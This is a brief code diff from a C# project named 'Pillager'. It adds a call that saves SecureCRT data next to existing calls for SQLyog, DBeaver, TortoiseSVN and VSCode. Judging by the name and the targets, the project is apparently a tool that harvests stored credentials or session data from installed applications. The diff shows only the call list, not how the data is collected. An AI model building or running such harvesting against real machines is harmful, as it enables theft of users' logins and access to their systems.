@@ -45,6 +45,7 @@ namespace Pillager
             SQLyog.Save(savepath);
             DBeaver.Save(savepath);
             TortoiseSVN.Save(savepath);
+            SecureCRT.Save(savepath);
 
             //Softwares
             VSCode.Save(savepath);
